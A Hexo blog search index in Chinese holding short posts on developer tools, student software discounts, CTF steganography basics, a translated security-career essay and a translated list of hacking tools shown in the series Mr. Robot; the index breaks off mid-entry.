<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[盘点那些互联网公司的学生优惠]]></title>
    <url>%2F2018%2F09%2F26%2Fit-student-discount%2F</url>
    <content type="text"><![CDATA[JetBrainsJetBrains是捷克的一家软件公司，该公司专业生产各种编程语言的IDE，其中包括Java的IDE —— Intellij IDEA，Python的IDE —— PyCharm，JavaScript的IDE —— WebStorm，C/C++的IDE —— CLion等等。JetBrains系列的IDE一直以强大易用著称，甚至有人说，一个优秀的程序员应该使用JetBrains全家桶。JetBrains的大多数IDE都是收费的，有的分为社区版（Community Edition）和专业版（Professional Edition）两种，专业版相比社区版有更多的功能，但也会收取相应的费用，然而，JetBrains对学生提供免费授权计划，学生只要验证学生身份即可免费使用JetBrains的所有IDE。 Microsoft ImagineMicrosoft Imagine原名为DreamSpark，是微软为学生提供的一个资源集合，它包括了一些软件和服务，学生只要验证学生身份即可使用其中的工具。个人认为，Imagine相比之前的DreamSpark，为学生提供的免费资源少了许多。具体而言，它提供如下资源： Parallels Desktop for Mac Pro Edition：macOS上最好的虚拟机产品，提供免费试用3个月 Visual Studio Community 2017：原本就是免费的 面向学生的 Microsoft Azure 入门版 Microsoft虚拟学院课程：原本就是免费的 Pluralsight SQL Server 2017 Developer Edition Visual Studio Code：微软推出的编辑器，原本就是开源免费的 Visual Studio for Mac：原本就是免费的 Windows Embedded 8.1 Industry Pro Update Windows Server 2016 Windows应用商店免费开发人员帐户 WintellectNow Xamarin Studio Community Edition：原本就是免费的 Visual Studio的PHP Tools插件 GitHub Student Developer PackGitHub学生开发者包（GitHub Student Developer Pack）是GitHub与其他公司一起创建的，旨在让学生从一个地方免费访问最好的开发者工具，这样他们就可以边做边学。其中包括的工具有： Algolia Atom：GitHub推出的编辑器，原本就是开源免费的 AWS Bitnami CARTO CrowdFlower Datadog DigitalOcean：美国一家VPS提供商，提供50美元优惠劵 Flatiron School GitHub无限制的私人仓库 Gitkraken：跨平台的Git GUI客户端，提供免费一年的专业帐户 HackHands Heroku：美国的一家PaaS厂商，提供一个长达2年的Hobby类型Dyno，Dyno是Heroku上所有应用程序的基本运行环境，Hobby类型的Dyno比免费的要稍微好一些，详细配置信息请参考官方文档 JetBrains系列IDE Namecheap：美国的一家域名注册商，提供免费一年SSL证书、一年.me后缀域名优惠 SendGrid Sentry Stripe Taplytics Thinkful Transifex Travis CI Unreal Engine 学生只要验证学生身份就可以使用GitHub学生开发者包中提供的工具。 阿里云云翼计划学生验证学生身份后，每月仅需9.9元即可租用一台阿里云服务器。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Jupyter Notebook常用扩展]]></title>
    <url>%2F2018%2F09%2F25%2Fjupyter-notebook-extensions%2F</url>
    <content type="text"><![CDATA[扩展机制在介绍常用扩展之前，有必要先来介绍一下 jupyter_contrib_nbextensions与其说这是一个插件，倒不如说这是一群插件，该插件集合了大多数的Jupyter Notebook常用扩展。使用pip install jupyter_contrib_nbextensions命令即可安装，安装完成后使用jupyter contrib nbextension install --user命令进行些许配置，参数--user指定安装到当前用户家目录下的.jupyter文件夹下。等到安装并配置完成后，打开Jupyter Notebook网页，会出现Nbextensions选项卡，点击进入此选项卡中，可以启用或禁用相应的插件。 ##]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[editorconfig 是什么]]></title>
    <url>%2F2018%2F09%2F23%2Fwhat-is-editorconfig%2F</url>
    <content type="text"><![CDATA[开发同一项目的不同的人，可能会使用不同的编辑器，又会有不同的设置，这就会造成不同的代码格式，为了统一同一项目的代码格式，由此诞生了EditorConfig，它包含了一个用于定义代码格式的文件和一批编辑器插件，这些插件可以让编辑器读取配置文件并依此格式化代码。一个典型的 EditorConfig 配置文件如下所示：123456789101112131415161718192021222324252627282930313233# 这是一行注释，以#开头# 表示此文件为最顶级root = true# 设定每个文件每行以换行（LF）结束，文件末尾添加一个新行[*]end_of_line = lfinsert_final_newline = true# 匹配所有以 js 和 py 为后缀名的文件# 设定其编码为 UTF-8[*.&#123;js,py&#125;]charset = utf-8# 匹配所有以 py 为后缀名的文件，设定其缩进为 4 个空格[*.py]indent_style = spaceindent_size = 4# 设定 Makefile 文件的缩进为 Tab[Makefile]indent_style = tab# 匹配lib目录下所有以 js 为后缀名的文件，设定其缩进为 2 个空格[lib/**.js]indent_style = spaceindent_size = 2# 设定 package.json 和 .travis.yml 的缩进为 2 个空格[&#123;package.json,.travis.yml&#125;]indent_style = spaceindent_size = 2 此配置文件应该保存为.editorconfig并放置在项目目录中，编辑器的 EditorConfig 插件会从文件打开目录开始依次向其父级目录查找并读取配置文件，直到遇见root = true为止。有很多项目在初始化时都会生成相应的.editorconfig文件，比如 Angular。另外，Visual Studio 和 JetBrains 家的大部分 IDE 都已经原生支持了 EditorConfig，因此不用再安装插件；对于 Sublime Text 和 Vim 等未原生支持的编辑器，EditorConfig 官网提供了相应的插件下载地址。要了解详细的支持列表，请访问 EditorConfig 官网。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[写代码应该用哪种字体]]></title>
    <url>%2F2018%2F09%2F23%2Fcode-font%2F</url>
    <content type="text"><![CDATA[等宽字体与比例字体等宽字体（Monospaced）是指字符宽度相同的电脑字体，与此相对，字符宽度不尽相同的电脑字体称为比例字体（Proportional）。一图胜千言，如下：在早期的电脑中，由于技术的局限，无法进行字母宽度的比例调整，因此只能将每个字符都制作成一样的宽度，从而形成了等宽字体。在等宽字体中，字母 i，j 显得两侧余白较多，而字母 w，m 等的笔画显得相当拥挤。但是随着图形用户界面主流的更新和计算机技术的提高，处理比例字体的局限性得到了突破，因此现在排版上显得比较自然的比例字体的使用已经相当普及。这里所讨论的都是英文字体，对于中文字体而言，一般认为它们都是等宽的。Windows 中常用的等宽字体为 Consolas；macOS 中常用的等宽字体为 Menlo；Linux 中常用的等宽字体为 Mono。 衬线字体与非衬线字体顾名思义，衬线体（Serif）和无衬线体（Sans-Serif）的区别就在于有无衬线，而衬线则指的是字形笔画末端的装饰细节部分。一图胜千言，如下：这里所讨论的都是英文字体，对于简体中文字体而言，习惯性称衬线字体为宋体，非衬线字体为黑体，如下：衬线字体常用于印刷业，而且特别适用于长篇文章段落；非衬线字体简洁大方，适用于广告、标志、牌子等短句。另外，系统、程序和网页中的字体也几乎都是非衬线字体，即使是很长的段落，这是因为显示器分辨率低，字体不能减小，如果用衬线字体，那些边边角角就很难用像素显示清楚，结果反而不利于阅读。Google 在 2015 年就将其原本的衬线体 Logo 换成了无衬线体 Logo:我们在写 Word 文档时，常用的英文衬线字体就是 Times New Roman；而在做 PPT 时，个人倾向于使用非衬线字体微软雅黑。 编程写代码应该使用的字体对于衬线或非衬线要求不大，但强烈建议使用等宽字体，这样可以便于代码对齐，因为比例字体的宽度不定，这会对代码对齐造成极大的困难。另外，还应该对特殊字符有较高的辨识度，比如 I（大写i）、l（小写L）、1（数字1），0（数字0）、O（大写o） 等。基于以上，个人倾向于使用 Consolas，它是 Windows 中自带的一款等宽、非衬线字体。 术语在下载别的字体时，可能会遇到相关术语，如下： sans：无衬线体 gothic：哥特体，即无衬线体 mono：等宽字体 bold：粗体 italic：斜体 bolditalic：加粗斜体 regular：常规体 sc：即 Simplified Chinese，简体中文 ts：即 Traditional Chinese，繁体中文 配色关于代码配色，就真是个“仁者见仁，智者见智”的问题了，个人要求满足以下两点： 采用黑色背景 官网提供多种编辑器的支持 综上，个人倾向于使用Dracula。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[开发环境代表什么]]></title>
    <url>%2F2018%2F09%2F23%2Fwhat-is-development-environment%2F</url>
    <content type="text"><![CDATA[按照编程语言的执行原理，一般将其分为编译型语言（如 C）和解释型语言（如 Python），对于编译型语言来说，它的开发环境就代表该语言的编译器和其基本类库，对于解释型语言来说，它的开发环境就代表该语言的解释器和其基本类库。请注意，这里我并没有提到编辑器，因为编辑器并不属于每种语言所特有的范畴。对于解释型语言来说，它的开发环境就等于运行环境，而对于编译型语言，可以说它不需要运行环境。请注意，Java 可以理解为是一种先编译后解释的语言，所以运行 Java 程序之前需要安装 JRE（Java 运行环境）。如今许多语言的 IDE（集成开发环境），已经集编辑器、该语言的编译器/解释器、基本类库等于一体。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[谈谈SEO]]></title>
    <url>%2F2018%2F09%2F23%2Ftalk-about-seo%2F</url>
    <content type="text"><![CDATA[SEO，即搜索引擎优化(Search Engine Optimization)，下面列出几点SEO方面的建议： 页面的URL应该足够反映页面的内容]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[隐写术]]></title>
    <url>%2F2018%2F09%2F22%2Fsteganography%2F</url>
    <content type="text"><![CDATA[第一步拿到一个被隐写的文件，第一步当然是判断该文件是哪种类型的文件，一般可以通过文件后缀名判断之，若不能通过文件后缀名判断，则可以使用 Linux 中的 file 命令，直接输入 file a即可检查 a 文件的类型。知道文件类型后，就可以对症下药，依据相应的类型使用相应的办法，此时，不妨再查看一下文件对应的二进制数据，所有电子信息的本质无非是二进制，可以在二进制数据中搜索CTF或FLAG等关键字，发现是否存在隐藏信息。Windows下可以使用Sublime Text 3 的插件HexViewer查看二进制信息。Linux 下可以使用 xxd 命令查看文件二进制数据。 图片隐写图片内容首先应该检查图片内容本身是否存在某些隐藏信息，遇到不熟悉的图片可以尝试谷歌搜图，或许可以发现更多信息。 ExifExif，即可交换图像文件格式(Exchangeable image file format)，可以记录JPEG格式图片的属性信息和拍摄数据。有的JPEG格式图片会具有Exif信息，在Windows中查看属性选项卡中的详细信息项即可查看。别的格式的图片不具备Exif信息。如下图片： JPEGPNGGIFBMP音频隐写音频隐写一般会用到MP3stego，该软件会将信息编码到 MP3 文件中，同时也可以从被隐写的 MP3 文件中解码所需信息。下载该软件后在其MP3Stego文件夹下会有 2 个命令：Encode和Decode，Encode命令用于隐写信息，Decode命令用于解密被隐写的信息，使用decode -X -P pass svega_stego.mp3即可从svega_stego.mp3文件中解码所需信息，-P指定解密密码。 视频隐写其他隐写Word 文档Word 文档可能会隐藏某些信息，遇到 doc 文档可以尝试在 Word 选项中选择显示并打开隐藏文字选项。如下所示：像 Word 文档或 Excel 表格这样的富文本文件，可以直接解压之，查看其中是否包含某些特殊文件。类似的题可以参考Fonts,认真你就输了等等。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微软平台技术简介]]></title>
    <url>%2F2018%2F09%2F22%2Fmicrosoft-technology%2F</url>
    <content type="text"><![CDATA[Windows微软最初的操作系统的DOS，DOS只是一个命令行形式，后来 .NETWindows Phone]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[网站统计与分析]]></title>
    <url>%2F2018%2F09%2F22%2Fweb-analytics%2F</url>
    <content type="text"><![CDATA[几个术语 PV：Page View，即页面浏览量或点击量，用户每次刷新即被计算一次。 UV：Unique Visitor，指独立访客数，以cookie为依据，访问网站的一台电脑客户端为一个访客。一天内相同的客户端只会被计算一次。 IP：指独立IP数。一天内相同IP地址只被计算一次。 相关工具有许多第三方的工具可以帮助站长统计和分析网站流量，比如百度统计、腾讯分析、Google Analytics(GA)等。个人经常使用Google Analytics。这类工具的原理大致为：它们会生成一段特定的JS代码，站长需要将这段代码插入到自己网站的页面中，当访客访问网站时，这段代码会收集访客的行为信息，并上传到它们的服务器上。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[版本号的意义]]></title>
    <url>%2F2018%2F09%2F21%2Fversion-number%2F</url>
    <content type="text"><![CDATA[软件版本号的确定没有一个统一的规范，但大都遵循一个固定的格式，即X.Y.Z格式，其中： X代表主版本号，一般当软件整体重写，或出现不向后兼容的改变等重大更新时，增加X，同时重置Y、Z为0，X为0时表示软件还在开发阶段； Y代表次版本号，增删功能时增加Y，同时重置Z为0； Z代表修订号，修复Bug时增加Z。 除此之外，还会有一些修饰词，比如： alpha表示内部测试版； beta表示公开测试版； rc即Release Candidate，表示候选版本，即将作为正式版发布； release表示正式发行版； lts即Long Term Support，表示长期支持版。 有的项目有自己的一套规则，比如Ubuntu、Visual Studio等，它们采用发布年份作为版本号；Node.js规定X为偶数的是稳定版，X为奇数的是开发版；TeX的版本号不断趋近于π。随着版本号定义的越来越混乱，GitHub起草了一个语义化版本(Semantic Versioning)规范，为开源项目做出了一定指导意义。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[top的增强版：htop]]></title>
    <url>%2F2018%2F09%2F19%2Fhtop-top%2F</url>
    <content type="text"><![CDATA[toptop是Linux下一个常用命令，用来监视系统的运行状况，类似于Windows的任务管理器，下图是top命令的运行界面：top的运行结果可以大致分为7个部分： 第1行显示了系统概况 第2行显示了进程概况 第3行显示了CPU概况 第4行显示了内存概况 第5行显示了Swap分区概况 第6行为空行，用以显示运行命令时输入的参数 剩下部分则为每个进程的详细信息 第1行 字符 含义 top - 系统概况 18:37:24 当前系统时间 up 130 days, 6:22, 系统已运行时间 1 user, 当前登录用户数 load average: 0.02, 0.04, 0.00 系统平均负载，三个数值分别为1分钟、5分钟、15分钟前到现在的平均值。 第2行 字符 含义 Tasks: 进程(任务)概况 23 total, 总进程数 1 running, 运行的进程数 22 sleeping, 睡眠的进程数 0 stopped, 停止的进程数 0 zombie 僵尸进程数 第3行 字符 含义 Cpu(s): CPU概况 3.7%us, 用户(user)进程占用CPU百分率 0.7%sy, 系统(system)进程占用CPU百分率 0.0%ni, 用户进程空间内改变过优先级(niced)的进程占用CPU百分比 95.7%id, CPU空闲(idle)率 0.0%wa, 等待(wait)IO的CPU时间百分比 0.0%hi, 硬中断(hardware interrupt)占用CPU的百分比 0.0%si, 软中断(software interrupt)占用CPU的百分比 0.0%st 第4行 字符 含义 Mem: 内存(memory)概况，数值以kb为单位 524288k total, 内存总量 278140k used, 内存使用量 246148k free, 内存空闲量 0k buffers 缓冲的内存量 第5行 字符 含义 Swap: Swap分区概况，数值以kb为单位 65536k total, Swap分区总量 65536k used, Swap分区使用量 0k free, Swap分区空闲量 28800k cached 缓冲的Swap分区量 剩下部分 字符 含义 PID 进程号 USER 进程创建者 PR 进程优先级 NI nice值。越小优先级越高，最小-20，最大20（用户设置最大19） VIRT 进程使用的虚拟(virtual)内存总量，单位kb。VIRT=SWAP+RES RES 进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA SHR 共享(share)内存大小，单位kb S 进程状态。D=不可中断的睡眠状态，R=运行态，S=睡眠态，T=跟踪/停止态，Z=僵尸态 %CPU 进程占用CPU百分比 %MEM 进程占用内存百分比 TIME+ 进程运行时间 COMMAND 运行进程时所使用的命令 命令在top命令运行界面也可以输入相关命令，具体如下： q：退出top运行界面 P：以占据CPU百分比排序 M：以占据内存百分比排序 T：以累积占用CPU时间排序 s：修改刷新时间间隔，默认每隔3秒刷新信息。按下s键，然后按下数字，即可修改刷新时间间隔为你输入的数字，单位为秒。例如：按下s键，在按数字1键，即可实现每秒刷新一次 回车或空格：手动立即刷新 k：终止指定的进程。按下k键，再输入要杀死的进程的pid，再按回车键，选择信号类型，以数字标示，默认15为杀死，本步可省略直接按回车键（常用为-9） h：显示可输入的命令帮助菜单 htophtop是一款第三方的命令行工具，它可以被视为是top的增强版，在Ubuntu下可使用apt install htop命令安装，下图是htop命令的运行界面：当了解了top运行界面的各种参数的含义后，htop运行界面就变得不言而喻了，下面简要介绍一下可以在htop运行界面执行的相关命令： 优势综上所述，htop相比top有以下优势： 彩色标识CPU、内存、Swap分区 CPU、内存、Swap分区使用情况直观易懂 底部有命令提示 支持方向键选择进程]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[curl wget]]></title>
    <url>%2F2018%2F09%2F19%2Fcurl-wget%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[terminal与shell]]></title>
    <url>%2F2018%2F09%2F19%2Fterminal-shell%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[强大的autojump]]></title>
    <url>%2F2018%2F09%2F19%2Fautojump%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那么，你想在安全行业工作吗？]]></title>
    <url>%2F2018%2F09%2F18%2Fso-you-want-to-work-in-security%2F</url>
    <content type="text"><![CDATA[本文翻译自https://medium.freecodecamp.org/so-you-want-to-work-in-security-bc6c10157d23 ，正文如下： 每隔一段时间，我就会收到一封来自陌生人的电子邮件，询问有关如何从事安全行业（计算机，信息，网络等等）的建议。这很棒！我们需要更多充满激情，富有创造力和勤奋工作的人，他们希望努力使技术更安全。它也是一种非常经济稳定的谋生方式。关于这个确切的话题还有很多其他帖子，但我会根据自己的经验提出一些高层次的想法。 警告：这不像电影。在安全方面工作并不像好莱坞所描绘的那样。我喜欢观看黑客风格的电影和节目，以获得幻想和逃避，但日常工作并不像在屏幕上看起来那样快速和性感（就我的经验来说）。现在，对于大多数职业来说都是如此，即使我从未花费一天时间在地下巢穴中解读流媒体代码，我仍然认为这是一个令人兴奋，重要，具有挑战性和有益的领域。 没有标准或完美的课程。安全是一个广泛的，跨学科的应用领域。有设计和构建安全系统的人，尝试破坏系统的人，尝试检测入侵的人以及介于两者之间的大量事物。如果我学到了什么，我就知道没有单一的，标准的或最好的准备路径。也许这会随着领域的成熟而改变，但我对此表示怀疑。它也不像其他需要认证的专业领域（例如医学，法律），这既可以是解放也可以是恐吓。独立于你如何获得它，你将受益于对应用计算机科学或计算机和软件的工作方式的强烈理解。许多应用计算机科学都是关于解决抽象层的问题，安全性通常是在这些抽象中找到有缺陷的假设……然后找出如何最好地修复（或利用）它们。我是通过从公立大学获得计算机科学工程学位来做到这一点的。对我来说，一些更有用的主题是操作系统，网络，计算机体系结构和编译器。除此之外，我也参加了我感兴趣的技术课程（例如数字信号处理，生物医学工程，人工智能），并通过学生俱乐部和实习中的项目工作探索了网络，隐私增强技术和（网络，客户端）应用安全方面的安全主题。你还将从了解使用技术的人（用户，客户等）的工作方式中获益。如果我能回到我的大学时代，我会参加一些心理学，社会学和人文因素课程。我与具有相似传统学术背景的专家（例如计算机工程，计算机科学，数学等学位）工作过。我也认识很多不太具有典型背景的人（例如化学，电影研究，心理学，平面设计）和一些在完成学位之前辍学的人。关于安全认证的话题，我没有任何一个认证，我不认为我因此而被拒之门外。有些行业或国家可能会要求他们为信息安全专业人士提供服务，他们肯定是一些合理的人所追求的 - 告诫者！在文化方面，我建议阅读黑客宣言或如何成为一名黑客，这对许多安全专家来说都是灵感和道德的指南针。 即使你不把自己比作黑客，理解和你一起工作的一些人的心态也是有帮助的。除此之外，我所知道的大部分知识都是随着时间的推移，从朋友和同事的轶事，安全博客，会议论文和演示文稿，邮件列表，本地安全组和其他在线资源中学到的。我今天听到或摄取的很多东西都来自我的Twitter安全列表上的人。 停止阅读，开始做。这适用于任何职业追求，但尽可能快地获得一些真实的工作经验。这是缩小你的兴趣，优势和未来发展领域的最佳方式。你还可以更好地了解正常工作日和环境的组成，包括你喜欢和不喜欢的内容。我生命中最有价值的职业相关经历之一是做了一个我讨厌的实习，因为它，所以我强烈地转向了另一个方向:)在如何开始获得经验方面，我没有一个简单的答案。查看招聘会和会议，参与俱乐部或其他组织，以大胆的热情申请实习和兼职工作。在来谷歌之前，我在一个特许摊位清理干燥的nacho奶酪，这是我作为社区游泳池救生员定期轮班的一部分。这一点工作经验帮助我获得了大学宿舍管理员的工作，这在一家大型制药公司的IT实习面试时无疑是相关的。我在大学的俱乐部获得了一些“真实”（即非课程）软件体验，并且我在学校新闻组上发现了一个网络安全实习机会，这可能给了我足够的相关工作经验，让谷歌的某个人考虑为我安排一个面试。 写代码。我认识的最好的安全工程师也在积极编写代码。这为他们提供了编写软件的第一手经验，包括无意中但不可避免地引入了安全漏洞。后者迫使所有开发者真正感同身受。毕竟，一直编写安全代码通常比指出不安全的代码更难。如果你坚持从一个大型项目开始，请尝试修复开源项目中的错误。每个人都喜欢修复bug的人！该项目将感谢你，这通常是一种获得真实体验的好方法，也是你未来工作的好方法。 破坏代码。花时间寻找软件bug。了解如何使用调试器，网络扫描程序，Web调试代理和软件模糊测试。花时间在黑客游乐场，可用于所有技能水平。我在大学时第一次使用https://www.hackthissite.org ，并在https://infosec.rocks 列出了其他一些自我指导的黑客培训网站。还有一个很好的黑客挑战、比赛列表（例如CTF），不想浪费时间的人可以点这里。或者查找并报告你使用的实际软件中的bug。有许多软件供应商为安全漏洞提供现金奖励，包括Chrome和Google，以及Internet Bug Bounty计划涵盖的一些核心开源项目。除了自己找到错误之外，我还建议你继续学习并了解其他人的发现（bugtraq，fulldisclosure，oss-sec）。 分享知识。我开始了解安全是从大学中由同龄人组织的一个名为SigMil的特别有趣的ACM小组中，成员们会对他们感兴趣的安全主题进行粗略的演示。我们还参加了一年一度的DEFCON朝圣之旅，参加会谈（十年前要做的事情要容易得多），购买安全书籍或杂志，或者只是与来自世界其他地方的志同道合的人聊聊他们的工作。在Google，我直接从同行那里学到了很多东西，分享他们的专业知识，斗争和半生不熟的想法。分享知识很重要，原因如下： 分享知识是在大型组织或项目中扩展最佳安全实践（或避免陷阱）的必要且有效的方法。 我几乎总是在准备演示文稿或编写文档时自己学习一些东西，因此对于我来说，发现一个主题的隐藏角落是一个很好的强制功能。 我几乎总是从读者那里学到一些东西，无论是问题，评论还是后续讨论。 把爱传出去。 练习你的沟通。在安全方面工作意味着你需要定期向不同的受众解释复杂的技术问题，每个受众都有不同的词汇，专业知识和激励措施。在描述漏洞的严重性时，你很少会依赖通用指标，在推广最佳安全实践时也不会有任何闪亮的东西。面对FUD(即恐惧、不确定、怀疑)，你必须让人们不受欢迎，然后专注于危机之外的行动。所有这些都需要沟通艺术方面的技能，特别是解释和谈判。你不可能从纯粹的技术资源中掌握这门艺术，所以练习，发表，并永远致力于改进。 期望努力工作，有时会失败。也许这很明显，但值得明确表示。安全是挑战性工作。你需要不断学习新事物，因为你需要保护的技术环境正在快速发展，这比我们弃用旧的，尚未完全安全的内容的能力要快得多。经常有时间和资源的威胁行动者也能很快适应现有的防御。安全可能会有压力。你正在处理模棱两可的问题，不完善的解决方案，有限的数据以及对人类安全的真正威胁。很难用安全性衡量成功，根据我的经验，人们更有可能注意到失败。 在确保现实世界技术的同时，我们最终还是在减轻风险的过程中，无论RSA供应商的某个人告诉你什么，都没有银弹。 （尝试）保持乐观。由于我刚才概述的一些原因，这个领域可能令人沮丧。跟上技术和开发的创新速度似乎是不可能的。 我的意思是，缓冲区溢出漏洞已存在数十年，但我们今天（2016）仍然经常看到利用它们的高影响漏洞。你会经常听到人们尖叫安全是不可能的，而且情况正在恶化，或者说出我们为什么都失败的完全雄辩点。现实可能是苛刻的，但如果我们专注于积极思考并考虑技术所提供的所有东西，那真是令人印象深刻！这不完美。它永远不会是完美的。但我认为当今安全的最前沿比10年前要好得多，我们可以通过一定程度的合理保证做一些相当令人印象深刻的事情，这让我感到乐观。 请求帮忙。如果你遇到混蛋，不要气馁。多年来，我在信息安全行业看到了大量的沙文主义和自我主义者。通过对话（在线，会议等等）快速变成谁是最精英的人并不罕见。也许这不是每个人的经历，但我在很大程度上取得了成功，这得益于我现在认为是朋友的许多优秀安全人员的支持，建议，指导和帮助。仅仅因为你必须寻求帮助并不意味着你不会因为这项工作而被裁掉。如果您需要帮助，请尽管问。只要确保你做尽职调查，尽可能让人们帮助你。大多数专家都非常忙碌，所以如果你问一个有足够背景和没有拼写错误的好问题，你就更有可能获得有用的回应。 祝你好运并且快乐Hacking！我偶然发现了一些其他安全职业建议的想法： Thomas Ptacek，Charlie Miller，Jeremiah Grossman，Richard Bejtlich和Bruce Schneier分享了他们的想法http://krebsonsecurity.com/tag/security-career-advice/ 我的朋友并且是Chrome同事Chris Palmer分享了可靠的建议https://noncombatant.org/2016/06/20/get-into-security-engineering Michal Zalewski（又叫做lcamt​​uf）根据他在安全方面20年（令人敬畏的，经常是开创性的）的工作分享了4个简单的经验：https://lcamtuf.blogspot.com/2016/08/so-you-want-to-work-in-security-but-are.html 译者注本文作者为Parisa Tabriz，她是计算机安全专家，曾在谷歌担任工程总监。由于她在黑客和互联网安全方面的经验，她被称为谷歌的“安全公主”。2012年，“福布斯”杂志将她列入“30位30岁以下技术行业观察人员”名单。]]></content>
      <categories>
        <category>Translation</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[《黑客军团》中使用的软件]]></title>
    <url>%2F2018%2F09%2F18%2Fsoftware-used-in-mr-robot%2F</url>
    <content type="text"><![CDATA[本文翻译自https://alternativeto.net/list/66/software-used-in-mr-robot ，正文如下： 本文盘点了获得艾美奖和金球奖剧情/惊悚系列电视剧——《黑客军团》中黑客使用的软件。下面的列表包含到了第二季第11集！ Kali LinuxKali Linux是针对安全研究人员进行渗透测试的Linux发行版，但同时也被黑客使用，因为它集成了很多黑客工具。由于它是黑客的首选操作系统，所以它在《黑客军团》中经常有过出现。 WickrWickr是一个端到端的加密聊天应用程序，具有诸如消息可调到期时间等功能。在第二季中，fsociety组织使用它来保密通信。 Tor BrowserTor浏览器被广泛认为是最好的匿名工具。它将使你的互联网活动难以被追踪，当第二季第8集中fsociety的成员Trenton用Tor浏览器向Vimeo上传一个泄露的关于非法群体监视的FBI电话会议时，利用到了它。 Raspberry Pi树莓派是一个小型的，可编程的计算机板，旨在教孩子们学习计算机科学。由于它的低成本，多功能性和简单性，它也是业余爱好者和程序员的最爱。第一季第5集中Elliot将一个树莓派安装到铁山的气候控制系统中，以便fsociety后期可以远程升高存储E公司磁带备份的存储空间的温度，从而实现美国消费者债务的很大一部分记录的备份被销毁。 FileZillaFileZilla是世界上最流行的FTP客户端，并且是最强大和用户友好的客户端之一。在第一季第4集中Trenton使用FileZilla上传一个漏洞利用程序到fsociety的FTP服务器上，即Elliot将安装在铁山的气候控制系统中的树莓派，以销毁美国消费者债务中很大一部分的记录。 PwnixPwnix是一个为渗透测试人员定制的用于网络黑客和安全的Android ROM。Elliot在第二季第9集中使用了一个Pwnie Express Pwn Phone（Pwnix预装），以至于他和Darlene渗透进黑暗军团的电话。 DeepSound在第一季第8集中，Elliot使用DeepSound将文件隐藏在CD的常规音乐曲目中，以便隐藏文件只能使用DeepSound软件查看。这是一种被称为隐写术的技术。 ProtonMailProtonMail是一个安全的端到端加密电子邮件服务，基于瑞士，Elliot在第一季第8集中使用过。《黑客军团》背后的团队研究安全电子邮件服务的程度很深，以至于他们实际上联系了ProtonMail开发者，询问用户是否有可能在ProtonMail中监控他们自己的电子邮件活动。ProtonMail开发者非常喜欢帐户访问日志的想法，他们最终在ProtonMail的v2.0版本中实现了这个功能。想要了解更多请访问：https://protonmail.com/blog/protonmail-mr-robot-secure-email/ HDShredderHDShredder 4企业版在第一季第10集中用于在E公司被黑之后安全地擦除所有fsociety的硬盘信息，然后他们在狗狗火葬场焚烧所有的硬盘。 John the RipperJohn the Ripper是Kali Linux中包含的一个密码破解工具，用于检测简单的Unix密码，并试图通过每秒数千次的猜测来破解它们。这被称为暴力破解，Elliot在第一季第2集中通过使用它来破解E公司的临时首席技术官Tyrell Wellick的邮箱密码。 WegtWget是一个命令行工具，可以发出HTTP(S)请求。在《黑客军团》中它被用于与John the Ripper结合使用Shellshock漏洞来攻击E公司的邮件服务器。 Social-Engineer ToolkitSET是一个专注于诸如网络钓鱼等社会工程攻击的测试框架。社会工程学欺骗受害者给予攻击者敏感信息。在第一季第5集中，Mobley使用SET的伪造短信功能让主管离开铁山，以便Elliot可以渗透进去。 OpenWrtOpenWrt是Angela在第二季第6集中黑进FBI时使用的路由器固件。 mimikatzmimikatz是一个后渗透工具，它将黑客可能需要执行的一些有用任务捆绑在一起。在第二季第6集中，它被装在USB橡皮鸭中并交给Angela，作为一个备份计划。 btscannerbtscanner是一个包含在Kali Linux中的工具，它可以在无需配对的情况下提取关于蓝牙设备的尽可能多的信息。在第一季第6集中，Elliot使用btscanner与Bluesniff和Metasploit结合，通过MultiBlue蓝牙USB加密狗连接到附近警车中的电脑，并渗透进监狱的网络，以帮助一个名叫Vera的毒贩越狱。 BluesniffBluesniff是一款蓝牙设备发现工具。在第一季第6集中，Elliot使用Bluesniff与Metasploit和btscanner结合，通过MultiBlue蓝牙USB加密狗连接到附近警车中的电脑，并渗透进监狱的网络，以帮助一个名叫Vera的毒贩越狱。 KVM(Kernel-base Virtual Machine)KVM是一个管理程序，它是一个可以通过虚拟机运行其他操作系统的软件。Elliot使用KVM在Kali Linux内虚拟化Windows 7。在第一季第8集中，它使用KVM运行DeepSound。 MetasploitMetasploit框架是Kali Linux中包含的一个软件，可以使渗透测试人员更容易发现网络中的漏洞。Meterpreter是可以在Metasploit框架中运行的数百个Payload之一，并且在第一季第6集中使用到。在第一季第6集中，Elliot使用Metasploit Framwork和Metapreter与btscanner和Bluesniff结合，通过MultiBlue蓝牙USB加密狗连接到附近警车中的电脑，并渗透进监狱的网络，以帮助一个名叫Vera的毒贩越狱。 Framaroot在电视中称为RooterFrame的Framaroot，在第一季第3集中被Tyrell 